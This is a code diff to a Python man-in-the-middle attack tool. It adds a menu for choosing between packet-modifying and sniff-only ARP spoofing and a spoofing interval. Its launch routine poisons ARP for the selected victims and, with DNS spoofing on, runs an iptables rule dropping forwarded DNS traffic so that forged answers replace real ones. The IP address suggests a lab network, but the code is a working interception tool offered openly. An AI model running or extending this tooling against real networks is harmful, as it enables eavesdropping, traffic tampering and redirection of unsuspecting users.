@@ -68,33 +68,47 @@ def choose_victims(hosts, gateway):
         except Exception:
             print("Invalid input. Please try again.")
 
-def choose_arp_mode():
-    print("\n[*] Choose ARP spoofing mode:")
-    print("  1. Normal       (every 2 seconds)")
-    print("  2. Light        (every 10 seconds)")
-    print("  3. Stealth      (send only once)")
-    print("  4. Custom       (enter your own interval in seconds)")
-    
-    while True:
-        mode_input = input("Select mode [1-4, default=1]: ").strip()
-        if mode_input == "" or mode_input == "1":
-            return 2
-        elif mode_input == "2":
-            return 10
-        elif mode_input == "3":
-            return -1
-        elif mode_input == "4":
-            try:
-                custom_interval = int(input("Enter custom interval in seconds (> 0): ").strip())
-                if custom_interval >= 1:
-                    return custom_interval
-                else:
-                    print("Please enter a number greater than or equal to 1.")
-            except ValueError:
-                print("Invalid input. Please enter an integer.")
-        else:
-            print("Invalid mode selection. Please enter 1, 2, 3, or 4.")
+def choose_arp_settings():
+    print("\n[*] Choose ARP spoofing type:")
+    print("  1. Normal ARP spoofing (MITM, modify packets)")
+    print("  2. Anonymous ARP spoofing (SMITM, only sniff traffic)")
 
+    while True:
+        mode_input = input("Your choice [1-2]: ").strip()
+        if mode_input == "1":
+            anonymous = False
+            break
+        elif mode_input == "2":
+            anonymous = True
+            break
+        else:
+            print("Invalid input. Please choose 1 or 2.")
+
+    print("\n[*] Choose ARP spoofing frequency:")
+    print("  1. Fast (1 second)")
+    print("  2. Normal (2 seconds)")
+    print("  3. Slow (10 seconds)")
+    print("  4. Custom")
+
+    while True:
+        freq_input = input("Your choice [1-4]: ").strip()
+        if freq_input == "1":
+            return anonymous, 1
+        elif freq_input == "2":
+            return anonymous, 2
+        elif freq_input == "3":
+            return anonymous, 10
+        elif freq_input == "4":
+            try:
+                custom = int(input("Enter custom interval in seconds (>0): ").strip())
+                if custom >= 1:
+                    return anonymous, custom
+                else:
+                    print("Enter a value > 0.")
+            except ValueError:
+                print("Invalid input. Enter a number.")
+        else:
+            print("Choose 1, 2, 3, or 4.")
 
 def launch_attack(enable_dns):
     iface = choose_interface()
@@ -115,7 +129,7 @@ def launch_attack(enable_dns):
         print("[-] No victims selected.")
         sys.exit(1)
 
-    interval = choose_arp_mode()
+    anonymous, interval = choose_arp_settings()
 
     fake_ip = "192.168.56.102"
     if enable_dns:
@@ -128,7 +142,7 @@ def launch_attack(enable_dns):
 
     arp_thread = threading.Thread(
         target=start_arp_spoofing,
-        args=(victims, gateway_ip, gateway_mac, attacker_mac, iface, stop_event, interval),
+        args=(victims, gateway_ip, gateway_mac, attacker_mac, iface, stop_event, interval, anonymous),
         daemon=True
     )
     arp_thread.start()
@@ -136,7 +150,7 @@ def launch_attack(enable_dns):
     try:
         if enable_dns:
             print("[*] Starting DNS spoofing...")
-            os.system("iptables -I FORWARD -p udp --dport 53 -j DROP")  # block real DNS
+            os.system("iptables -I FORWARD -p udp --dport 53 -j DROP")
             start_dns_spoofer(fake_ip=fake_ip, iface=iface)
         else:
             print("[*] ARP spoofing running. Press Ctrl+C to stop...")
